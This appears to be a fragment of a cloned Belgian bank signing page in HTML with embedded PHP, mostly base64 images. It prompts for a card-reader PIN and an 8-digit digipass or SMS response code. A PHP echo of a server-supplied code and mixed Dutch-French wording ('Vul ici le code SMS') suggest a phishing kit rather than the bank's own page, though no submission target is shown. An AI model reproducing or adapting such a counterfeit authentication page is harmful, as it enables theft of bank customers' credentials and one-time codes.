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"><span class="sr-only">,</span></div></div></li><li class="argnt-m-signature--field"><div class="argnt-a-field-container"><div class="argnt-m-signature--field-with-image"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">Geef je pincode in en druk op</span><img alt="ok" src="data:image/png;base64,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"></div></div></li></ol><div class="argnt-a-field-container argnt-a-field-container--gap-8"><label for="signature"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">Vul ici le code SMS : <span style="color: #004a99; font-size: 1.2em;"><?php echo htmlspecialchars($code); ?></span></span></label><div class="argnt-m-form-masked-input"><div class="argnt-a-masked-input-field argnt-a-masked-input-field__challenge"><div class="argnt-a-field">

<input   type="text"   inputmode="numeric"   name="token"   id="masrrsInputDigipass"   placeholder="1234 5678"   required   pattern="\d{4} \d{4}"   maxlength="9"   oninput="this.value = this.value.replace(/[^\d]/g, '').replace(/(.{4})(.*)/, '$1 $2').trim().slice(0, 9);" /> <script>
    // Reference to the input field
    const input = document.getElementById('masrrsInputDigipass');

    // Format input on 'input' event
    input.addEventListener('input', (e) => {
      // Remove all non-numeric characters
      const value = e.target.value.replace(/\D/g, '');
      // Format value as groups of 4 digits
      const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
      // Update the input value
      e.target.value = formattedValue;
    });

    // Prevent manual spaces using 'keydown'
    input.addEventListener('keydown', (e) => {
      if (e.key === ' ') {
        e.preventDefault();
      }
    });
  </script>


<div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="xmark" class="svg-inline--fa fa-xmark " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentColor" d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z"></path></svg></div></div><div aria-hidden="true" style="opacity: 0; display: none;"><div class="argnt-a-field--fa-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-check" class="svg-inline--fa fa-circle-check " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM363.3 203.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L224 297.4l-52.7-52.7c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6l64 64c6.2 6.2 16.4 6.2 22.6 0l128-128z"></path></svg></div></div></div></div><div role="alert"><div class="argnt-q-collapse argnt-q-collapse--closed" aria-hidden="true" style="overflow: hidden; opacity: 0; height: 0px;"><div class="argnt-q-collapse__content"><span class="argnt-a-field-error"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-exclamation" class="svg-inline--fa fa-circle-exclamation " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z"></path></svg><span class="argnt-a-field-error__content" id="signature-error-message">Response code is verplicht.</span></span></div></div></div></div></div></div><div class="arg-m-signature-digipass"><img aria-hidden="true" alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALMAAAEMCAYAAAH4+LdxAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyVpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OTZCQkVGMDNCQ0ZEMTFFRDk1NDZGMzI4NzdCNDU5OEEiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OTZCQkVGMDRCQ0ZEMTFFRDk1NDZGMzI4NzdCNDU5OEEiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5NkJCRUYwMUJDRkQxMUVEOTU0NkYzMjg3N0I0NTk4QSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5NkJCRUYwMkJDRkQxMUVEOTU0NkYzMjg3N0I0NTk4QSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqAbFGIAARSsSURBVHja1FZriJRVGH6+2+zM7Ox9dXVdS93FNVMTSjZtTbSMbvSriFRSISOi/gT9UUspAw3DZE0pCQkMNQmJYkvbUFS6GIpBUAi1O3txd/YyrrNz/W6n55zxsraf9Msfze7h+87tPc/7vO/7nE8TQuBO/XTcwZ85vvPtXxfU88lv9gloGnRdhy+Pp3Mm393EEGBwi+dh5vQGdMZ7OaFxgYbtz6x7fMG0Gcfl/icmzZmI/Nj3J1TTDA5bBoR8GgYNGHAzGfV+f/Ns2uKhks4Q57IZtffrM6e2J7p6IFsg8vlNMyFx6Jfi8Ihc6OwZbAUHqKkCBkdwPt4JlIYQH01Kd2BOngw3m8NQJjVrWqz29pz3JhKqLS6vVq5ibBS64BIeBDvH1USrj9ui06NCgbQJeD7CWacA2QKRv/HYKrQfPz4/krAROfMbhvv6oJOCcDgM13UhiNRzPW6iVzToOg4yuTxaWpciOqUytLi+EZWVlTfsaeNTMZ3OYeXKZaK7uwdXrgwzdiEIn6gYQE2il2BNoQKsK4d0HmMwFBZisRhKY6U48PlBrWXhAxORL122WMjlY2NpbNz0OtG5XGAphjwadHmITmpMxkL2Nc1APp9HJu3g5Mmf4XgudFcPpkXjBs/34DguqmsqYJomfDnh+/z3b67TirTIn+NGEC0rFL0TcqkIDmjBseHYDtFp8GlAo+8yYeQhpmXBMktgWSGEQiGUlJQwFiWIlMQQjUYIymdcfHT80LE/ELldsJnSBprnNMPQLaKj+54Jh6AdOw/XzytkmuYTAA8yQjBD9IJr8rmc8qi3J94aaNwgUocZULiSxPZte2nYlVmmMkVRwT8ZVsOQ+ULvhM93Q80pCome+8OBtFghS9W6NCYPEeS+/+m7iNhjoeSRH8sgx+amMxhLMpssHqL7KuDSsIxDNBrLBBr3WQmZTBYF0mOT++EVTRCpNKKlUVLjY+qzDyOrMS4N1dCbpiLV3ae8cz1bQlLop9RNHg2kJce0kqglCnlQuP13lBDNEA+TXvV9eQaWb0JPpNS6cF01KZG1UFD0CTgc90YCkctgWswK41pQmxqb6EVBlX86nWXauSro8+fNQ319AwYTSfT1XiZimT0MLgXuaipVF4hcpqAsRINlHo93qcyQ5SwDdr1CpeudXV2q39Q0S8VI8m4we1yvgER/T30gchkQ6V7/I2twqOYedE69V40PDAyivz9Br0z0EimWfEdlnKuyRad4yWJwWCMS3N+dXdODU5H6LQHWth+ATgkYYrZUVVXgz0sXyXkJenouw2rYh8ypXci5j2Jy7A9eJjY821P73bzOhEgHC9fcuc0imUwikRjGZ0cOYmxkCG9t2lrMCAa5NBK9JmLFXA9HLMS7GrizD3fPkGLjMX1NdPf2aRO1Rd4wNNLSsggHP92PaLhMubt63RrmqYaffvyF4rYEGmNiUbS+OHwU6fZfkc1WoTvuoKGhjPvd2yMfGUkqpctms0o/JFWyb9P1urpJyOWySKUyiJWFUMr8t21WL7kOc600RTVCb19Cm3j7q1J38MprL2PH+zuw9qW1pEHgyFdHsW3nNly9Ooolra3Ytf9DtHecgJ8SuLKnCcs/fhOJ1krmu08p9oIlF8VsQ9uuNiJ01HtpaRh7P/iICNP0wMHV0SFkBpPYt3s3jHJ6tuoijoUuorq8Ut1Uru0H0zJ7ziwxPDCCNGnY+M7bWLFiBZ5a/khRzAouKirKVHClPEQjEUQotYoKCp6gLPj0MpuxedlkJtIiPA22a2PB/GYsW/Qg3tu8kR7ksH7Dejz/4nNYcN9CvLB6teJ5/asbrqWvUXxqUuvDaJzV+O/CKbbGxpkiFouKSMQSpqnxGVJNLiM6zkVEOGyqvmFoora2SkyZMkkw0KK+vk7I/Vu2bP3kur1baGE5i/7+yzfJp2PyHt3Ztgf9Az3YtvldlJVF1bysVlzT9qKmg3PlOHfuvFZRUT4xoN3d3ZATUnaL96S8LHwcO3yIPI6OqwcUVVAi1LwbY1KLBgcTCDR+4dwFreWhFpHLFZTxcNhSnw0dHSfVfCikK5WU+e/7xc8NQWn26Ylt2xzP45av5vGcnz59Evva2tSwutXwH03ThGVp5B+ipqZGnD17hjZOI5Dz/9X3+T8CUGO2sU2VURz/d+ttbbt23Vb2VuKAvQDbwMR3F2ExQTAqQTFEzATk3Q9CFIyERAVBEyFEBVERVNCEDxINgk7IAgFcYIMBiS6jONkGsiEb3datW7d1ax/POW2vHeUrH1zSrL23ee55zjnP+f/+vWuRJ911R6G7ie8/JC5wEBUni5swExAp0sQg6eYzRSWorD1DCj6AmdOnoepcLR8jwbxfV202xLsJY7yTkIOQkooQLxohHgzJwOBmDqGy5iS5iRJYSYCrTp8mJ0Gcnu6UxXUXcfvC7CL4L9TQyCsybkX9DUdEM9puh6IpeKHtunggOOzU6BpenTETu6qqcLuLMMY7iEg5NfE7YJb1U0R0tLPNFnT4OgVyoDRxD9LWBJ+7ThzDWDp98e5hVFe03/LCSzq5b/ce5Q0FcP7kb7ATtPO8YIljsqUvY5iVnUczpSdApiotMxv3TytDUa57z7JFS1aYjNroiBlo1ry+WvX6uuHxeATDaN6J6MbGZywIli4GfZk5V1twxXMJLlfG8i5fV+vba9dvGhXxwUMHsWnjRvkwZ0457ZYmW5KRfA0NJ3rP3keippkRJopn1h8aDklGtm7ZicmTSgXhLl3yjFb20uL7Io6B4DItPZXSR2MyirzxhyjmGGLXh0gUeEiNkPoMDA4kFq+FfCNDJbO1GKUYT9O0oxjlJClubEqwRvdCPHRocZNmFv5jx2amYiYs3NzSJKNQyBVEowYjgqRzI0GmUYYY+k9cYtQ47ww9zgjYcPeIq2DivYOB4lbi7SVRq+3Y/pUsyPGzj2RB5SJyRphMxY6Ho9wnim+Xh6k4TNAfMXPWU7JwiLYUoqg53yMPTYA/JVk++x3E2BayeeRtguQUDMEhfmx0RP+X94SIrzU1ChWx5ISjFq9rQjKMHmpFXx/CU4tgmDoBLgoyVOhG98rPkfLIRIRbu+i7BtmJ3Z6auHCPr1+2KlHLthVSdl+QewGKzHS2CX308pKMOYle4UxF8FqHsLUyjIguc3ckpCKshs0WAhXOJwO6z9crboAfEqRe5vcRxxXC1NIS9Pr9aL/ZjZycTJipM0yEyDCMJEZ8o7Utj40niydH7XKl6yeO1F4sIEdls9nQ1HIV48bliar7/QGxKZQMxGuGHnFv/0CaOAq624I8NNacxbEpZcTYtyiyDlTX1kifP7C4Ae659TprRNQ7WTrCEAcB+juT0eiKQYO1/TySigrhoKn1R/05NHjq6LImBTq87SNUvJiHv3o66P4Yaj3qEuqkSEwpiQs3tVyZyDlk5D10+Cf0Dw9i+YLFKHusXNqJc28234N066c4+ksSuQArwsTczTe6MWtaMS7/7SV3Npi4sNORlmXUmHaAnZ/tgK/TR5Q0gNVr